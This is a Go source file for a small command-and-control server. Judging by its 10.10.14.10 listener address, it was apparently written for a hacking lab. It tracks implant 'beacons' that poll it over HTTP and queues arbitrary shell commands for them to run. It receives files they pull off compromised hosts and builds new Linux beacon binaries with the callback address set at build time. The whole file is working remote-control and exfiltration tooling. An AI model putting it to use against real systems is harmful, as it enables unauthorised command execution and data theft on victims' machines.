package main

import (
	"github.com/gorilla/mux"
	"fmt"
	"time"
	"log"
	"encoding/json"
	"net/http"
	"strconv"
	"os"
	"io"
	"os/exec"
	"strings"
	"bufio"
	"io/ioutil"
	"bytes"
	b64 "encoding/base64"
)

type CommandUpdate struct {
	Ip string
	Id string
	Type string
	Data string
}

type Beacon struct {
	Ip string
	Id string
	ExecBuffer []string
	DownloadBuffer []string
	LastSeen time.Time
}

var beacons []*Beacon = make([]*Beacon, 0)
var activeBeacon *Beacon
var cmdArgs = map[string]string {
    "help": "<command>...",
	"list": "",
    "exec": "<beacon id OR index> <command>...",
    "create": "<LHOST> <LPORT>",
	"download": "<beacon id OR index> <remote file> OR <remote file>...",
	"use": "<beacon id OR index>",
}

func receiveFile(beacon *Beacon, w http.ResponseWriter, r *http.Request) {
    r.ParseMultipartForm(32 << 20)
    var buf bytes.Buffer
    file, header, err := r.FormFile("file")
	
	if err != nil {
        fmt.Println("Failed to receive file.")
		return
    }

    defer file.Close()
    name := strings.Split(header.Filename, "/")
    io.Copy(&buf, file)
    saveBeaconFile(beacon, buf, name[len(name)-1])
    buf.Reset()
}

func saveBeaconFile(beacon *Beacon, data bytes.Buffer, name string) {
	path := "downloads"
	if _, err := os.Stat(path); os.IsNotExist(err) {
		os.Mkdir(path, 0700)
	}
	path += "/" + beacon.Ip
	if _, err := os.Stat(path); os.IsNotExist(err) {
		os.Mkdir(path, 0700)
	}
	path += "/" + beacon.Id
	if _, err := os.Stat(path); os.IsNotExist(err) {
		os.Mkdir(path, 0700)
	}

	err := ioutil.WriteFile(path + "/" + name, data.Bytes(), 0644)
    if err != nil {
		fmt.Println("Failed to save file.")
	}

	cwd, err := os.Getwd()

	if err != nil {
		log.Fatal(err)
	}

	fmt.Println("Saved " + name + " from " + beacon.Id + "@" + beacon.Ip + " to " + cwd + "/" + path + "/" + name)
}

func interfaceHandler(w http.ResponseWriter, h *http.Request) {
	json.NewEncoder(w).Encode(map[string]bool{"ok": true})
}

func beaconGetHandler(w http.ResponseWriter, r *http.Request) {
	var update CommandUpdate
	data := mux.Vars(r)["data"]
	respMap := make(map[string][]string)
	decoded, _ := b64.StdEncoding.DecodeString(data)
	
	json.Unmarshal(decoded, &update)
	beacon := registerBeacon(update)
	
	respMap["exec"] = beacon.ExecBuffer
	respMap["download"] = beacon.DownloadBuffer

	json.NewEncoder(w).Encode(respMap)
	beacon.ExecBuffer = nil
	beacon.DownloadBuffer = nil

	if len(update.Data) > 0 {
		out := strings.Replace(update.Data, "\n", "\n\t", -1)
		fmt.Println("\n[+] Beacon " + update.Id + "@" + update.Ip + " " + update.Type + ":")
		fmt.Println("\t" + out[:len(out)-1])
		prompt()
	}
}

func beaconPostHandler(w http.ResponseWriter, r *http.Request) {
	var update CommandUpdate
	data := mux.Vars(r)["data"]
	decoded, _ := b64.StdEncoding.DecodeString(data)
	
	json.Unmarshal(decoded, &update)
	beacon := registerBeacon(update)

	if update.Type == "upload" {
		fmt.Println("Receiving " + update.Data + " from " + beacon.Id)
		receiveFile(beacon, w, r)
	}
}

func startServerRoutine() {
	var router = mux.NewRouter()
	router.HandleFunc("/", interfaceHandler).Host("localhost")
	router.HandleFunc("/{data}", beaconPostHandler).Host("command.com").Methods("Post")
	router.HandleFunc("/{data}", beaconGetHandler).Host("command.com").Methods("Get")

	srv := &http.Server{
        Handler:      router,
        Addr:         "10.10.14.10:8001",
        WriteTimeout: 15 * time.Second,
        ReadTimeout:  15 * time.Second,
    }

	go func() {
    	log.Fatal(srv.ListenAndServe())	
	}()
}

func registerBeacon(updateData CommandUpdate) (*Beacon) {
	var beacon *Beacon
	for _, b := range beacons {
		if b.Id == updateData.Id {
			beacon = b 
		}
	}

	if beacon == nil {
		beacon = &Beacon{updateData.Ip, updateData.Id, nil, nil, time.Now()}
		beacons = append(beacons, beacon)
	} else {
		beacon.LastSeen = time.Now()
	}

	return beacon
}

func listBeacons() {
	for i, b := range beacons {
		fmt.Println("[" + strconv.Itoa(i) + "] " + b.Id + "@" + b.Ip + " last seen " + b.LastSeen.String())
	}
}

func createBeacon(lhost string, lport string) {
	exec.Command("/bin/sh", "-c", "rm out/*").Output()
	exec.Command("/bin/sh", "-c", "env CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags '-X main.cmdAddress=" + lhost + " -X main.cmdPort=" + lport + " -X main.cmdHost=command.com' -o out/beacon beacon/beacon.go").Output()
	fmt.Println("Created beacon in out directory.")
}

func execOnBeacon(cmd []string) {
	if cmd[1] == "*" {
		for _, b := range beacons {
			b.ExecBuffer = append(b.ExecBuffer, strings.Join(cmd[2:], " "))
		}
		return	
	}

	var beacon *Beacon = activeBeacon
	var cmdIndex = 1
	if beacon == nil {
		beacon = getBeaconByIdOrIndex(cmd[1])
		cmdIndex = 2
	}

	if beacon != nil {
		beacon.ExecBuffer = append(beacon.ExecBuffer, strings.Join(cmd[cmdIndex:], " "))
		fmt.Println("Added exec command to buffer for beacon " + beacon.Id + "@" + beacon.Ip)
	} else {
		fmt.Println("Beacon " + cmd[1] + " does not exist. Use list to show available beacons.")
	}
}

func downloadFile(cmd []string) {
	if cmd[1] == "*" {
		for _, b := range beacons {
			b.DownloadBuffer = append(b.DownloadBuffer, cmd[2])
		}
		return	
	}

	var beacon *Beacon = activeBeacon
	var cmdIndex = 1
	if beacon == nil {
		beacon = getBeaconByIdOrIndex(cmd[1])
		cmdIndex = 2
	}

	if beacon != nil {
		beacon.DownloadBuffer = append(beacon.DownloadBuffer, cmd[cmdIndex])
		fmt.Println("Added download command for beacon " + beacon.Id + "@" + beacon.Ip)
	} else {
		fmt.Println("Beacon " + cmd[1] + " does not exist. Use list to show available beacons.")
	}
}

func getBeaconByIdOrIndex(id string) (*Beacon) {
	var beacon *Beacon

	for _, b := range beacons {
		if b.Id == id {
			beacon = b
		}
	}

	bId, err := strconv.Atoi(id)
	
	if beacon != nil || (err == nil && bId < len(beacons)) {
		if beacon == nil {
			beacon = beacons[bId]
		}
		return beacon
	} else {
		return nil
	}
}

func checkArgs(cmd[] string) (bool) {
	amt := strings.Count(cmdArgs[cmd[0]], "<")
	if len(cmd[1:]) != amt && !strings.Contains(cmdArgs[cmd[0]], "...") {
		if amt == 1 {
			fmt.Println(cmd[0] + " requires " + strconv.Itoa(amt) + " arg: " + cmdArgs[cmd[0]])
		} else {
			fmt.Println(cmd[0] + " requires " + strconv.Itoa(amt) + " args: " + cmdArgs[cmd[0]])
		}
		return false
	}
	return true
}

func printHelp(cmd []string) {
	if len(cmd) == 2 {
		if val, ok := cmdArgs[cmd[1]]; ok {
			fmt.Println(cmd[1] + " usage: " + strings.ReplaceAll(val, "...", ""))
		} else {
			fmt.Println("Command " + cmd[0] + " does not exist.")
		}
	} else {
		for key, val := range cmdArgs {
			fmt.Println(key + " " + strings.ReplaceAll(val, "...", ""))
		}
	}
}

func processInput(input string) {
	cmd := strings.Fields(input);
	if len(cmd) > 0 && checkArgs(cmd) {
		switch cmd[0] {
		case "exec":
			execOnBeacon(cmd)
		case "create":
			createBeacon(cmd[1], cmd[2])
		case "list":
			listBeacons()
		case "download":
			downloadFile(cmd)
		case "use":
			activeBeacon = getBeaconByIdOrIndex(cmd[1])
			if activeBeacon == nil {
				fmt.Println("Beacon " + cmd[1] + " does not exist. Use list to show available beacons.")
			}
		case "help":
			printHelp(cmd)
		default:
			fmt.Println(cmd[0] + " is not a command. Use help to show available commands.")
		}
	}
}

func prompt() {
	if activeBeacon != nil {
		fmt.Print(activeBeacon.Id + "@" + activeBeacon.Ip + " ")
	}

	fmt.Print("c2> ")
}

func handleInput() {
	reader := bufio.NewReader(os.Stdin)
	first := true
	for {
		if first {
			first = false
		} else {
			fmt.Println()
		}
		
		prompt()
		input, err := reader.ReadString('\n')

        if err != nil {
            fmt.Fprintln(os.Stderr, err)
        }

		processInput(input)
	}
}

func main() {
	startServerRoutine()
	handleInput()
}